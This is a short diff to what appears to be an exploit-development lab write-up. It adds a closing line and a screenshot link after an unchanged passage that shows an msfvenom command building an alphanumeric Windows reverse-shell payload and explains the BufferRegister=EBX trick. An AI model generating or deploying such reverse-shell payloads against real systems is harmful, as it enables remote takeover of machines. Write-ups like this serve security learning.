@@ -155,3 +155,7 @@ Finally with everything falling into place, I create the shellcode:
 `msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.128 LPORT=443 -f python -b '\x00' -e x86/alpha_mixed BufferRegister=EBX -v shellcode`
 
 When generating alphanumeric shellcode, MSFvenom still prepends the payload with non-alphanumeric characters, which is very frustrating to say the least. This is because it needs some code to find itself in memory to use as a reference point for other operations. Luckily if you tell it where it is using a register, it becomes 100% alphanumeric-friendly. Since `EBX` is pointing to the top of the "A"s, I decide to put the shellcode right there, and tell MSFvenom that the shellcode is at the value in `EBX` with `BufferRegister=EBX`.
+
+Everything should be ready to go. I let the payload execute fully:
+
+![]({{site.baseurl}}/assets/images/lter/21.png)
